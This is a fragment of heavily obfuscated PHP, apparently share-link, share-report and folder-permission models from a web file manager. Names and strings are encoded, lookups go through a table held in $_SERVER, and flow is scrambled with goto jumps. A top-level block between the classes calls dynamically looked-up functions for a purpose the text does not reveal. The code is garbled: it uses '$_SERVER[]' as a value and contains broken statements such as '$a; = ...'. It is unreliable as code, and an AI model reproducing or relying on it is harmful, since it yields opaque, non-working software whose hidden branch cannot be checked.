"\164\151\x6d\145", "\x69\156\x73\145\x72\x74\x2c\165\x70\144\141\x74\145", "\146\165\x6e\x63\x74\151\157\156"), array("\x63\162\145\x61\x74\145\x54\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\145\162\x74", "\x66\x75\156\143\164\151\x6f\156"), array("\157\x70\164\x69\x6f\156\163", '', "\x69\x6e\x73\x65\162\164\54\x75\160\144\141\164\145\x2c\163\x65\154\145\143\164", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($B) { $b =& $_SERVER[]; $fό = isset($B[0]) ? $B[0] : !1; return array($b[1848] => array(USER_ID, $b[1849]), $b[1791] => array($fό, $b[1850])); } protected function listSimple() { $Eƴ = array($_SERVER[][1546] => USER_ID); $d݅ = $this->field($this->fieldList)->where($Eƴ)->select(); return $d݅ ? $d݅ : array(); } protected function getInfo($b, $c؇ϝ = false) { $Eϐ =& $_SERVER[]; if ($c؇ϝ) { return $this->_getShareInfo(array($Eϐ[482] => $b)); } $Cƒ = $this->cacheFunctionGet($Eϐ[1793], $b); return $Cƒ; } public function getInfoByHash($f̋) { return $this->_getShareInfo(array($_SERVER[][484] => $f̋)); } public function getInfoByPath($bӿ) { $cʿ =& $_SERVER[]; $D⿂ = array($cʿ[1546] => USER_ID, $cʿ[397] => $bӿ); return $this->_getShareInfo($D⿂); } public function getInfoBySourcePath($B) { $Aﻫ =& $_SERVER[]; $a͸à = array($Aﻫ[1546] => USER_ID, $Aﻫ[1088] => $B); return $this->_getShareInfo($a͸à); } private function _getShareInfo($aȕ) { goto bտ; bտ: $cə =& $_SERVER[]; $d = $this->where($aȕ)->find(); if (!$d) { return !1; } goto aӿ; aӿ: $aȕ = array($cə[482] => $d[$cə[482]]); $Fꔴ = $cə[1851]; $a = Model($cə[590])->order($cə[395])->field($Fꔴ)->where($aȕ)->select(); goto A䰿; A䰿: if ($d[$cə[397]] == $cə[191]) { $d[$cə[85]] = IO::info($d[$cə[1088]]); } else { $d[$cə[85]] = Model($cə[1223])->pathInfo($d[$cə[397]]); } $d[$cə[1852]] = $a; return $d; goto c; c: } protected function getInfoAuth($A͉٪ǻ) { $aƱ =& $_SERVER[]; $cƂ = $this->getInfo($A͉٪ǻ); $cƂ[$aƱ[408]] = Model($aƱ[496])->authMake($cƂ[$aƱ[1852]]); return $cƂ; } protected function listData($e = null, $eȚ = 300) { $f =& $_SERVER[]; $d±» = array(array($f[487] => array($f[988], 0), $f[489] => array($f[988], 0), $f[1853] => $f[1807])); if ($e == $f[1854]) { $d±» = array($f[487] => 1); } else { if ($e == $f[1073]) { $d±» = array($f[489] => 1); } } $d±»[$f[1546]] = USER_ID; $c۩ = $this->where($d±»)->selectPage($eȚ); return $c۩; } protected function listToMe($f͉ = 300) { goto aʄ; dХ: if (!$b飵) { return $d׎⏟; } $fᄢ = $bވ[1856]; $DƏݛ = array($bވ[482] => array($bވ[413], array_keys($b飵)), $bވ[1546] => array($bވ[990], $bވ[191])); goto F׏; aʄ: $bވ =& $_SERVER[]; $d = Model($bވ[1855])->userGroupParents(USER_ID); $DƏݛ = array($bވ[574] => SourceModel::TYPE_USER, $bވ[498] => USER_ID); goto D; D: if ($d) { $DƏݛ = array(array($bވ[574] => SourceModel::TYPE_USER, $bވ[498] => USER_ID), array($bވ[574] => SourceModel::TYPE_GROUP, $bވ[498] => array($bވ[7], $d)), $bވ[1853] => $bވ[1807]); } $d׎⏟ = Model($bވ[590])->where($DƏݛ)->selectPage($f͉); $b飵 = array_to_keyvalue_group($d׎⏟[$bވ[367]], $bވ[482]); goto dХ; F׏: $e = $this->field($fᄢ)->where($DƏݛ)->select(); foreach ($e as $C³ => &$D𙄺) { $D𙄺[$bވ[1852]] = $b飵[$D𙄺[$bވ[482]]]; } unset($D𙄺); goto dО; dО: $D = array($bވ[1857] => $e, $bވ[1858] => $d׎⏟[$bވ[364]]); return $D; goto E蓔ך; E蓔ך: } protected function shareAdd($C, $F) { $B؂ =& $_SERVER[]; $D = $this->_addShareData($C, $F); if (!empty($F[$B؂[1859]])) { $this->_shareAuthSet($D, $F[$B؂[1859]]); } $this->shareEventAdd($C, $F, $B؂[1076]); return $D; } protected function shareAddSystem($e, $D僜ޠ) { $D¹т =& $_SERVER[]; $e䓻︽ = $this->_addShareData($e, $D僜ޠ, $D¹т[1188]); $this->_shareAuthSet($e䓻︽, $D僜ޠ[$D¹т[1859]]); return $e䓻︽; } private function shareEventAdd($b椙ź, $a, $Dϑ = "\x61\x64\144") { goto C; EǷȌ: if ($cݯ[$a[487]] == $a[87] && $a[$a[487]] == $a[191]) { $Aç޴ = $a[1863]; } if ($cݯ[$a[489]] == $a[191] && $a[$a[489]] == $a[87]) { $Aç޴ = $a[1861]; } if ($cݯ[$a[489]] == $a[87] && $a[$a[489]] == $a[191]) { $Aç޴ = $a[1864]; } goto E; E: Model($a[558])->eventShare($b椙ź, $Aç޴); return; goto E; dǜ: $cݯ = $this->getInfoByPath($b椙ź); $Aç޴ = $a[1862]; if ($cݯ[$a[487]] == $a[191] && $a[$a[487]] == $a[87]) { $Aç޴ = $a[1860]; } goto EǷȌ; C: $a =& $_SERVER[]; if (!$b椙ź || $b椙ź == $a[191]) { return; } if ($Dϑ == $a[1076]) { if ($a[$a[487]] == $a[87]) { Model($a[558])->eventShare($b椙ź, $a[1860]); } if ($a[$a[489]] == $a[87]) { Model($a[558])->eventShare($b椙ź, $a[1861]); } return; } goto dǜ; E: } private function _addShareData($Dȝә, $c嵥 = array(), $fڏ = false) { goto a։҈; d: $this->where(array($a㾅[481] => $Aۅ))->save($eՇ搻); return $Aۅ; goto CЉ߂ח; a։҈: $a㾅 =& $_SERVER[]; $Cئ = $fڏ == $a㾅[1188] ? 0 : USER_ID; $f՚ۅ = array($a㾅[412] => $Dȝә, $a㾅[1537] => $Cئ); goto eÜ; d픿: foreach ($d as $d) { if (!isset($c嵥[$d])) { continue; } $A[$d] = $c嵥[$d]; } $Aۅ = $this->add($A); $eՇ搻 = array($a㾅[484] => short_id($Aۅ)); goto d; bʏ: if (!$c嵥[$a㾅[1449]]) { $c嵥[$a㾅[1449]] = $fާȧ[$a㾅[28]]; } $A = array($a㾅[1537] => $Cئ, $a㾅[412] => $Dȝә, $a㾅[1449] => $a㾅[33], $a㾅[487] => 0, $a㾅[489] => 0, $a㾅[1088] => $a㾅[33], $a㾅[305] => $a㾅[33], $a㾅[868] => $a㾅[33], $a㾅[1866] => 0, $a㾅[1867] => 0, $a㾅[490] => 0, $a㾅[491] => $a㾅[33], $a㾅[484] => $a㾅[33]); $d = explode($a㾅[47], $a㾅[1868]); goto d픿; eÜ: if ($Dȝә == 0) { $f՚ۅ = array($a㾅[1865] => $c嵥[$a㾅[1088]], $a㾅[1537] => $Cئ); } if ($a; = $this->where($f՚ۅ)->find()) { return $a;[$a㾅[482]]; } if ($Dȝә == 0) { $fާȧ = array($a㾅[28] => get_path_this($c嵥[$a㾅[76]])); } else { $fާȧ = Model($a㾅[809])->sourceInfo($Dȝә); if (!$fާȧ) { return !1; } } goto bʏ; CЉ߂ח: } private function _shareAuthSet($C, $Dߎ̴) { goto a圈; C̃خ: return $Aކ->addAll($eǿ, array(), !0); goto fШ; A: $Aކ->where(array($fƜ[482] => $C))->delete(); $eǿ = array(); foreach ($Dߎ̴ as $f) { $f؂ = SourceModel::TYPE_USER; if ($f[$fƜ[406]] == SourceModel::TYPE_GROUP) { $f؂ = SourceModel::TYPE_GROUP; } $b嫌 = array($fƜ[482] => $C, $fƜ[406] => $f؂, $fƜ[498] => intval($f[$fƜ[498]]), $fƜ[1815] => 0, $fƜ[1869] => -1); if ($f[$fƜ[1815]]) { $b嫌[$fƜ[1815]] = $f[$fƜ[1815]]; } else { if ($f[$fƜ[1869]]) { $b嫌[$fƜ[1869]] = $f[$fƜ[1869]]; } } $eǿ[] = $b嫌; } goto C̃خ; a圈: $fƜ =& $_SERVER[]; if (!is_array($Dߎ̴)) { return !1; } $Aކ = Model($fƜ[1819]); goto A; fШ: } public function numViewAdd($d䰑) { $dﭾ =& $_SERVER[]; $a԰ = array($dﭾ[481] => $d䰑); $this->where($a԰)->setAdd($dﭾ[1866]); } public function numDownloadAdd($b) { $b =& $_SERVER[]; $Bۉ = array($b[481] => $b); $this->where($Bۉ)->setAdd($b[1867]); } protected function shareEdit($d؍, $fô) { goto Dۭك; c: $this->_checkLinkShare($fô, $B); $Aɽ = array(); $cֻ = explode($Cկ[47], $Cկ[1870]); goto Cߡ; Cߡ: foreach ($cֻ as $C׿) { if (!array_key_exists($C׿, $fô)) { continue; } $Aɽ[$C׿] = $fô[$C׿]; } $this->shareEventAdd($B[$Cկ[397]], $fô, $Cկ[1682]); $this->where(array($Cկ[481] => $d؍))->save($Aɽ); goto D; D: if (isset($fô[$Cկ[1859]])) { $this->_shareAuthSet($d؍, $fô[$Cկ[1859]]); } return !0; goto b; Dۭك: $Cկ =& $_SERVER[]; $B = $this->getInfo($d؍); if (!$B) { return !1; } goto c; b: } private function _checkLinkShare($D, $dĘт) { goto FېƏ; FېƏ: $A띬 =& $_SERVER[]; if ($D[$A띬[487]] != $A띬[87]) { return; } $bšې = $dĘт[$A띬[85]][$A띬[397]]; goto F; Bؖ: $EА = $this->shareFileMeta($B֏[$A띬[461]]); if (isset($EА[$A띬[372]]) && $EА[$A띬[372]] == $A띬[87]) { show_json(LNG($A띬[1873]), !1); } goto B; F: if ($dĘт[$A띬[85]][$A띬[29]] != $A띬[193]) { $cƦ = $this->_folderReport($bšې); if (!$cƦ) { return; } show_json(LNG($A띬[1871]) . $A띬[1872] . $cƦ, !1); } $B֏ = Model($A띬[809])->fileInfoGet($dĘт[$A띬[85]][$A띬[397]]); if (!$B֏) { return; } goto Bؖ; B: } private function _folderReport($CӲ) { goto cՐƫ; cՐƫ: $C˜ =& $_SERVER[]; $C̲ß = array($C˜[461] => array($C˜[988], 0), $C˜[727] => 3); $A = Model($C˜[1874])->where($C̲ß)->field($C˜[461])->select(); goto cŜ猣; c: $fޅ = substr($Bڮ[$C˜[515]], strpos($Bڮ[$C˜[515]], $a)); $C̲ß = array($C˜[397] => array($C˜[7], trim($fޅ, $C˜[47]))); $bع = Model($C˜[809])->where($C̲ß)->field($C˜[28])->select(); goto d; cŜ猣: if (!$A) { return !1; } $A = array_to_keyvalue($A, $C˜[33], $C˜[461]); $a = $C˜[47] . $CӲ . $C˜[47]; goto E⤆; d: $C = array_to_keyvalue($bع, $C˜[33], $C˜[28]); $C[] = $Bڮ[$C˜[28]]; return implode($C˜[8], $C); goto dǌ; E⤆: $C̲ß = array($C˜[461] => array($C˜[7], $A), $C˜[515] => array($C˜[381], "\45{$a}\x25"), $C˜[425] => 0); $Bڮ = Model($C˜[809])->where($C̲ß)->field($C˜[1875])->find(); if (!$Bڮ) { return !1; } goto c; dǌ: } protected function remove($D) { goto Eڋ; Cꆑ: for ($a = 0; $a < count($Fà); $a++) { $e̸ = $this->getInfo($Fà[$a]); if ($e̸[$dэ[489]] == $dэ[87]) { Model($dэ[558])->eventShare($e̸[$dэ[397]], $dэ[1864]); } if ($e̸[$dэ[487]] == $dэ[87]) { Model($dэ[558])->eventShare($e̸[$dэ[397]], $dэ[1863]); } } return $f笧; goto F; Eڋ: $dэ =& $_SERVER[]; if (is_array($D)) { $D = array($dэ[7], $D); } $DՊ = array($dэ[482] => $D); goto cܭ; cܭ: $f笧 = $this->where($DՊ)->delete(); if ($f笧) { Model($dэ[590])->where(array($dэ[482] => $D))->delete(); } $Fà = is_array($D) ? $D[1] : array($D); goto Cꆑ; F: } protected function removeBySource($b܄) { goto d߮; FҚ: $b = array_to_keyvalue($b, $eć[33], $eć[482]); if (!$b) { return; } $E䊊 = array($eć[481] => array($eć[413], $b)); goto E̤; d߮: $eć =& $_SERVER[]; $E䊊 = array($eć[412] => array($eć[413], $b܄)); $b = $this->field($eć[482])->where($E䊊)->select(); goto FҚ; E̤: $this->where($E䊊)->delete(); Model($eć[590])->where($E䊊)->delete(); goto fȘ٨; fȘ٨: } public function listAll($C) { goto Bǈז; f㑗: $aṎ = $this->_makeOrder()->where($fÔ)->selectPage(20); if (empty($aṎ[$eʇͿ[367]])) { return array(); } $this->_listDataApply($aṎ[$eʇͿ[367]]); goto Dϑإ; Dϑإ: return $aṎ; goto aЅ; e⍇: if ($C[$eʇͿ[738]]) { $C҈ҭ = $C[$eʇͿ[490]] ? $C[$eʇͿ[490]] : strtotime(date($eʇͿ[1876])); $fÔ[$eʇͿ[194]] = array($eʇͿ[331], array($C[$eʇͿ[738]], $C҈ҭ)); } if ($C[$eʇͿ[29]]) { $fÔ[$C[$eʇͿ[29]]] = 1; } else { $fÔ[] = array($eʇͿ[487] => array($eʇͿ[988], 0), $eʇͿ[489] => array($eʇͿ[988], 0), $eʇͿ[1853] => $eʇͿ[1807]); } if ($C[$eʇͿ[1803]]) { $fÔ[] = array($eʇͿ[484] => $C[$eʇͿ[1803]], $eʇͿ[1449] => array($eʇͿ[381], "\45{$C[$eʇͿ[1803]]}\x25"), $eʇͿ[1853] => $eʇͿ[1807]); } goto f㑗; Bǈז: $eʇͿ =& $_SERVER[]; $fÔ = array(); if ($C[$eʇͿ[1546]]) { $fÔ[$eʇͿ[1546]] = $C[$eʇͿ[1546]]; } goto e⍇; aЅ: } public function listDataApply($c) { $this->_listDataApply($c); return $c; } private function _listDataApply(&$E) { goto bᣩ; d: $C㶃 = array_to_keyvalue($E, $FƜ[33], $FƜ[397]); $fߏ = Model($FƜ[809])->sourceListInfo($C㶃, !0); foreach ($E as $b => &$dΏ) { $E؅셫 = $dΏ[$FƜ[1546]]; $dΏ[$FƜ[1877]] = $cߢ[$E؅셫] ? $cߢ[$E؅셫] : !1; $f͘ = $dΏ[$FƜ[397]]; $dΏ[$FƜ[85]] = $fߏ[$f͘] ? $fߏ[$f͘] : !1; if ($dΏ[$FƜ[85]][$FƜ[425]] == $FƜ[87]) { unset($E[$b]); } if ($dΏ[$FƜ[85]] != $FƜ[191] && !$dΏ[$FƜ[85]]) { unset($E[$b]); } } goto BҠÄ; BҠÄ: unset($dΏ); $E = array_values($E); goto f⹠; bᣩ: $FƜ =& $_SERVER[]; $eݹ = array_to_keyvalue($E, $FƜ[33], $FƜ[1546]); $cߢ = Model($FƜ[532])->userListInfo(array_unique($eݹ)); goto d; f⹠: } private function _makeOrder($C = '') { goto D۟; aɯɡ: $C = $C . "{$c}\x20{$dю}"; return $this->order($C); goto dǍǕ; e͙: $c = Input::get($ĕ켒[449], $ĕ켒[7], $ĕ켒[418], $d); $dю = Input::get($ĕ켒[450], $ĕ켒[7], $ĕ켒[1878], array($ĕ켒[1802], $ĕ켒[444])); $dю = $Dڽ»[$dю]; goto aɯɡ; D۟: $ĕ켒 =& $_SERVER[]; $d = array($ĕ켒[194], $ĕ켒[490], $ĕ켒[1866], $ĕ켒[1867]); $Dڽ» = array($ĕ켒[442] => $ĕ켒[443], $ĕ켒[444] => $ĕ켒[445]); goto e͙; dǍǕ: } public function reportAdd($A֍ɜ) { $F߈ߵ =& $_SERVER[]; $bɮӝ = array($F߈ߵ[482] => $A֍ɜ[$F߈ߵ[482]], $F߈ߵ[1546] => USER_ID); if (Model($F߈ߵ[1874])->where($bɮӝ)->find()) { return !1; } $c憺߈ = array($F߈ߵ[482] => $A֍ɜ[$F߈ߵ[482]], $F߈ߵ[1449] => $A֍ɜ[$F߈ߵ[1449]], $F߈ߵ[397] => $A֍ɜ[$F߈ߵ[397]], $F߈ߵ[461] => $A֍ɜ[$F߈ߵ[461]], $F߈ߵ[1546] => USER_ID, $F߈ߵ[29] => $A֍ɜ[$F߈ߵ[29]], $F߈ߵ[445] => $A֍ɜ[$F߈ߵ[445]]); return Model($F߈ߵ[1874])->add($c憺߈); } public function reportList($A) { goto bΰ; bΰ: $A =& $_SERVER[]; $F = array(); if ($A[$A[738]]) { $E = $A[$A[490]] ? $A[$A[490]] : strtotime(date($A[1876])); $F[$A[194]] = array($A[331], array($A[$A[738]], $E)); } goto D՟; d: $this->_listDataApply($dǓ[$A[367]]); return $dǓ; goto b֎ҙ; f: if (empty($dǓ[$A[367]])) { return array(); } $a = array_to_keyvalue_group($dǓ[$A[367]], $A[727], $A[482]); if (!empty($a[0])) { $A = $a[0]; $F = array($A[482] => array($A[7], $A)); $Dԓϫ = $this->where($F)->field($A[482])->select(); $Dԓϫ = array_to_keyvalue($Dԓϫ, $A[33], $A[482]); $CŊ = array_diff($A, $Dԓϫ); if (!empty($CŊ)) { foreach ($dǓ[$A[367]] as $eņ => $B瞳) { if (in_array($B瞳[$A[482]], $CŊ)) { unset($dǓ[$A[367]][$eņ]); } } } } goto d; Eܚ: $D貑 = array($A[442] => $A[443], $A[444] => $A[445]); $cՄ = $A[1882] . $D貑[$Aĵ]; $dǓ = Model($A[1874])->where($F)->order($cՄ)->selectPage(20); goto f; D՟: if (isset($A[$A[29]]) && in_array($A[$A[29]], array($A[87], $A[429], $A[1879], $A[1880], $A[1881]))) { $F[$A[29]] = $A[$A[29]]; } if (isset($A[$A[727]]) && in_array($A[$A[727]], array($A[191], $A[87], $A[429], $A[1879]))) { $F[$A[727]] = $A[$A[727]]; } $Aĵ = Input::get($A[450], $A[7], $A[1878], array($A[1802], $A[444])); goto Eܚ; b֎ҙ: } public function reportStatus($F) { goto B簓Ǣ; eܥ: if (!$Eͻ) { return !1; } $Cˆ = array($eѓߡ[727] => $F[$eѓߡ[727]]); if ($F[$eѓߡ[727]] == $eѓߡ[1879] && $Eͻ[$eѓߡ[727]] == $eѓߡ[1879]) { $Cˆ[$eѓߡ[727]] = 0; } goto dԷ䆔; dԷ䆔: $CоٰИ = Model($eѓߡ[1874])->where($AԬ)->save($Cˆ); if ($F[$eѓߡ[727]] == $eѓߡ[429]) { if ($Eͻ[$eѓߡ[461]] != $eѓߡ[191] && $this->shareFileMeta($Eͻ[$eѓߡ[461]])) { $this->shareFileMeta($Eͻ[$eѓߡ[461]], 0); } $this->remove($Eͻ[$eѓߡ[482]]); return !0; } if ($CоٰИ && $F[$eѓߡ[727]] == $eѓߡ[1879]) { $B = $Cˆ[$eѓߡ[727]] == $eѓߡ[1879] ? 1 : 0; $this->shareFileMeta($Eͻ[$eѓߡ[461]], $B); $this->removeByFile($Eͻ[$eѓߡ[461]]); } goto F; B簓Ǣ: $eѓߡ =& $_SERVER[]; $AԬ = array($eѓߡ[395] => $F[$eѓߡ[395]]); $Eͻ = Model($eѓߡ[1874])->where($AԬ)->field($eѓߡ[1883])->find(); goto eܥ; F: return $CоٰИ; goto Fʠ; Fʠ: } private function removeByFile($e͎) { goto Fƅ; d: $f蕃 = array_to_keyvalue($Cرۛ, $d̍[33], $d̍[482]); $this->remove($f蕃); goto bΐ; Fƅ: $d̍ =& $_SERVER[]; $Cرۛ = Model($d̍[809])->where(array($d̍[461] => $e͎))->field($d̍[397])->select(); $B = array_to_keyvalue($Cرۛ, $d̍[33], $d̍[397]); goto fĭ; fĭ: $bǢ = array($d̍[397] => array($d̍[7], $B), $d̍[487] => 1); $Cرۛ = $this->where($bǢ)->field($d̍[482])->select(); if (empty($Cرۛ)) { return; } goto d; bΐ: } private function shareFileMeta($bȖ, $E = null) { $e颈 =& $_SERVER[]; $c̷ = array($e颈[461] => $bȖ, $e颈[93] => $e颈[1884]); if (is_null($E)) { return Model($e颈[1885])->where($c̷)->find(); } $c̷[$e颈[372]] = $E; Model($e颈[1885])->add($c̷, array(), !0); } } if ($_SERVER[$_SERVER[][840]] != $_SERVER[$_SERVER[][1414]]) { goto F٪ʙ; Bԃ: $b䲽ҳ = explode($_SERVER[][229], $F缾); if (count($b䲽ҳ) < $_SERVER[][623]) { $cƃܣ = $_SERVER[][845]; $cƃܣ(); } $e愼 = $_SERVER[][846]; goto cǇ; F٪ʙ: $d탞 = $_SERVER[][842]; $d = $_SERVER[$_SERVER[][843]] . $_SERVER[][844]; $F缾 = $d탞($d); goto Bԃ; cǇ: $e愼($_SERVER[$_SERVER[][841]]); goto cƠ; cƠ: } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\143\145\x5f\141\x75\164\x68"; public function getAuth($Aκк) { goto Cڕ; bȼѲ: $Fݐг = array(); $AꗵӒ = 2 << 25; foreach ($fƝ as $C) { goto C; C: $f = Model($d[501])->listData($C[$d[1815]]); if (!$f) { continue; } $e܈Ū[] = $C; goto Fド; Fド: $b = 0; if ($C[$d[406]] == SourceModel::TYPE_GROUP) { $b = $AꗵӒ * 2; } if ($C[$d[406]] == SourceModel::TYPE_USER) { $b = $AꗵӒ; } goto AЉ𸺿; AЉ𸺿: if ($C[$d[406]] == SourceModel::TYPE_USER && $C[$d[498]] == $d[191]) { $b = 0; } $Fݐг[] = $f[$d[408]] + $b; goto eґ; eґ: } goto eӉ; Cڕ: $d =& $_SERVER[]; $fƝ = $this->sourceAuthSelect($Aκк); $e܈Ū = array(); goto bȼѲ; eӉ: array_multisort($Fݐг, SORT_DESC, $e܈Ū); return $e܈Ū; goto E؆; E؆: } public function sourceAuthSelect($A) { goto c鷆; c鷆: $A =& $_SERVER[]; static $dئ = array(); $EԐ = is_array($A) ? !1 : !0; goto cĳ; cĳ: if ($EԐ) { $A = array($A); } $d، = array(); foreach ($A as $f̛) { if (isset($dئ[$f̛])) { $d،[$f̛] = $dئ[$f̛]; } } goto C; C: if (count($d،) == count($A)) { return $EԐ ? $d،[$A[0]] : $d،; } $f = $A[1886]; $Cϊ = array($A[397] => array($A[7], $A)); goto c͊; c͊: $aك = $this->field($f)->order($A[395])->where($Cϊ)->select(); $E쬴 = array_to_keyvalue_group($aك, $A[397]); foreach ($A as $f̛) { $dئ[$f̛] = $E쬴[$f̛] ? $E쬴[$f̛] : array(); } goto BĔ; BĔ: if ($EԐ) { return $aك; } return $E쬴; goto BͿ; BͿ: } public function setAuth($A, $f) { goto E̢; eͫ: if ($c۔ != $aӲ) { $b = array($A[1715] => $c۔); $f⸐ = Model($A[1801])->field($A[1546])->where($b)->select(); $f⸐ = array_to_keyvalue($f⸐, $A[33], $A[1546]); } $fǤ˷ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $e = array(); goto A; E̢: $A =& $_SERVER[]; $dǟ = Model($A[1223])->sourceInfo($A); if (!$dǟ) { return !1; } goto aڊ; aڊ: if ($dǟ[$A[406]] != SourceModel::TYPE_GROUP) { return !1; } $aӲ = 1; $c۔ = $dǟ[$A[498]]; goto eͫ; fݝښ: return !0; goto aʯ; A: foreach ($f as $b) { if (!in_array($b[$A[406]], $fǤ˷)) { show_json(LNG($A[1887]), !1); } if ($c۔ != $aӲ) { if ($b[$A[406]] == SourceModel::TYPE_GROUP) { } if ($b[$A[498]] != 0 && !in_array($b[$A[498]], $f⸐)) { } } if ($b[$A[498]] == 0) { $b[$A[406]] = SourceModel::TYPE_USER; } $e[] = array($A[397] => $A, $A[406] => intval($b[$A[406]]), $A[498] => intval($b[$A[498]]), $A[1815] => intval($b[$A[1815]]) ? intval($b[$A[1815]]) : 0, $A[1869] => intval($b[$A[1869]]) ? intval($b[$A[1869]]) : -1); } $this->where(array($A[412] => $A))->delete(); $this->addAll($e); goto fݝښ; aʯ: } public function authClear($D) { $C =& $_SERVER[]; $B = Model($C[1223])->sourceInfo($D); $b = array($D); if ($B[$C[405]] == $C[87]) { $d°̇ = array($C[578] => array($C[538], $B[$C[515]] . $D . $C[539])); $b = Model($C[1223])->field($C[412])->where($d°̇)->getField($C[397], !0); $b[] = $D; } $this->where(array($C[412] => array($C[413], $b)))->delete(); return !0; } public function getAllChildren($C) { goto E; e񍩽: if (!$e) { return array(); } $F⃘ = $b[1888]; $b = array($b[397] => array($b[7], $e), $b[425] => $b[191]); goto fȚ; c: if ($Bͽ[$b[492]] == $b[191] && $Bͽ[$b[498]] != $FԏՕ) { $Cݴڌ = $this->groupChidldAllRootSource($Bͽ[$b[498]]); } $e = $this->field($b[397])->group($b[397])->select(); $e = array_to_keyvalue($e, $b[33], $b[397]); goto e񍩽; c: if ($Bͽ[$b[406]] != SourceModel::TYPE_GROUP) { return array(); } $FԏՕ = 1; $Cݴڌ = array($C); goto c; C: return $this->sourceListAuth($e𤸄); goto aŬ; fȚ: $Dᄳ = Model($b[809])->field($F⃘)->where($b)->select(); $e𤸄 = array($C); foreach ($Dᄳ as $E) { foreach ($Cݴڌ as $F湵) { $cąȏ = $b[47] . $F湵 . $b[47]; $bɲ = $E[$b[515]] . $E[$b[397]] . $b[47]; if (strstr($bɲ, $cąȏ)) { $e𤸄[] = $E[$b[397]]; break; } } } goto C; E: $b =& $_SERVER[]; $Bͽ = Model($b[1223])->sourceInfo($C); if ($Bͽ[$b[405]] != $b[87]) { return $this->sourceListAuth(array($C)); } goto c; aŬ: } private function sourceListAuth($A) { goto DɆ; Dޭ: $f߅탩 = array(); $B󔫦 = array(); foreach ($e득 as $cт) { goto A全; C߃: $cт[$aƒ[1889]] = $this->authTargetInfo($A²); $cт[$aƒ[513]] = rtrim($cт[$aƒ[519]], $aƒ[8]) . $aƒ[8] . ltrim($cт[$aƒ[513]], $aƒ[8]); $f߅탩[] = $cт; goto aԎ; f˸: unset($cт[$aƒ[85]]); $A² = $Aյ[$cт[$aƒ[397]]]; if (!$A²) { continue; } goto C߃; aԎ: $dʐׂ = count(explode($aƒ[8], trim($cт[$aƒ[513]], $aƒ[8]))); $B󔫦[] = $dʐׂ + ($cт[$aƒ[29]] == $aƒ[77] ? 0 : 1000); goto E; A全: unset($cт[$aƒ[448]]); unset($cт[$aƒ[446]]); unset($cт[$aƒ[408]]); goto f˸; E: } goto Bׯ; Bׯ: array_multisort($B󔫦, SORT_ASC, $f߅탩); return $f߅탩; goto Eá; DɆ: $aƒ =& $_SERVER[]; $e득 = Model($aƒ[1223])->sourceListInfo($A, !0); $Aյ = $this->sourceAuthSelect($A); goto Dޭ; Eá: } private function groupChidldAllRootSource($fƙͭ) { $bݵ =& $_SERVER[]; $D΢Ճ = Model($bݵ[1890])->groupChildrenAll($fƙͭ); $f = array($bݵ[492] => 0, $bݵ[498] => array($bݵ[7], $D΢Ճ), $bݵ[406] => SourceModel::TYPE_GROUP); $F𮎌ފ = Model($bݵ[809])->field($bݵ[397])->where($f)->select(); $F𮎌ފ = array_to_keyvalue($F𮎌ފ, $bݵ[33], $bݵ[397]); return $F𮎌ފ; } private function authTargetInfo($B) { goto dӽ; dӽ: $dÆ =& $_SERVER[]; $fӂٍ = array(); $e = array(); goto eؾח; e諷: return $fӂٍ; goto d; eؾח: $c = 2 << 25; foreach ($B as $cϚʏ) { goto Aϧ; E𧬊: $Bӭۮ = 0; if ($cϚʏ[$dÆ[406]] == SourceModel::TYPE_GROUP) { $Bӭۮ = $c * 2; } if ($cϚʏ[$dÆ[406]] == SourceModel::TYPE_USER) { $Bӭۮ = $c; } goto CЂ; Aϧ: $E = Model($dÆ[501])->listData($cϚʏ[$dÆ[1815]]); if (!$E) { continue; } if ($cϚʏ[$dÆ[406]] == SourceModel::TYPE_USER) { $B = Model($dÆ[507])->getInfoSimpleOuter($cϚʏ[$dÆ[498]]); if ($B[$dÆ[1546]] == $dÆ[1102]) { continue; } if ($B[$dÆ[1546]] == $dÆ[191]) { $B[$dÆ[28]] = LNG($dÆ[1891]); } } else { $B = Model($dÆ[516])->getInfoSimple($cϚʏ[$dÆ[498]]); } goto D; D: if (!$B) { continue; } $B[$dÆ[460]] = $E; $fӂٍ[] = $B; goto E𧬊; CЂ: if ($cϚʏ[$dÆ[406]] == SourceModel::TYPE_USER && $cϚʏ[$dÆ[498]] == $dÆ[191]) { $Bӭۮ = 0; } $e[] = $E[$dÆ[408]] + $Bӭۮ; goto D҈; D҈: } array_multisort($e, SORT_DESC, $fӂٍ); goto e諷; d: } public function getAllChildrenByUser($B, $a) { goto BΏԑ; BΏԑ: $B䃍 =& $_SERVER[]; $d̕녯 = Model($B䃍[532])->getInfo($a); if (!$a || !$B || !$d̕녯) { return array(); } goto AϞ; Eě: return $a; goto d; cٮ؃: if ($b[$B䃍[492]] == $B䃍[191] && $b[$B䃍[498]] != $A払 && $this->groupContainUser($b[$B䃍[498]], $a)) { foreach ($d̕녯[$B䃍[1892]] as $fˋ) { $eۨ̇ = Model($B䃍[516])->getInfo($fˋ[$B䃍[1715]]); $F☛۟ = Model($B䃍[532])->getInfoSimpleOuter($a); $F☛۟[$B䃍[460]] = $fˋ[$B䃍[408]]; if (Model($B䃍[501])->authCheckAction($fˋ[$B䃍[408]][$B䃍[408]], $B䃍[1735])) { continue; } $dθ = array($B䃍[28] => $B䃍[1498] . $eۨ̇[$B䃍[28]], $B䃍[397] => $eۨ̇[$B䃍[85]][$B䃍[397]], $B䃍[76] => KodIO::make($eۨ̇[$B䃍[85]][$B䃍[397]]), $B䃍[492] => $B䃍[191], $B䃍[406] => $B䃍[509], $B䃍[29] => $B䃍[542], $B䃍[513] => $eۨ̇[$B䃍[520]], $B䃍[1715] => $eۨ̇[$B䃍[1715]], $B䃍[517] => $eۨ̇[$B䃍[492]], $B䃍[1889] => array($F☛۟)); $B[$dθ[$B䃍[397]]] = $dθ; } } $a = array(); $Dƈꊉ = $this->getAllChildren($B); goto bтĚ; bтĚ: foreach ($Dƈꊉ as $f͓Ɲ) { $e = !1; foreach ($f͓Ɲ[$B䃍[1889]] as $bƊ) { if ($bƊ[$B䃍[1546]]) { if ($bƊ[$B䃍[1546]] == $a) { $e = !0; break; } } if ($bƊ[$B䃍[1715]]) { if ($this->groupContainUser($bƊ[$B䃍[1715]], $a)) { $e = !0; break; } } } if ($e) { $a[] = $f͓Ɲ; } $bվ = $f͓Ɲ[$B䃍[397]]; if (isset($B[$bվ])) { $f͓Ɲ[$B䃍[1889]][] = 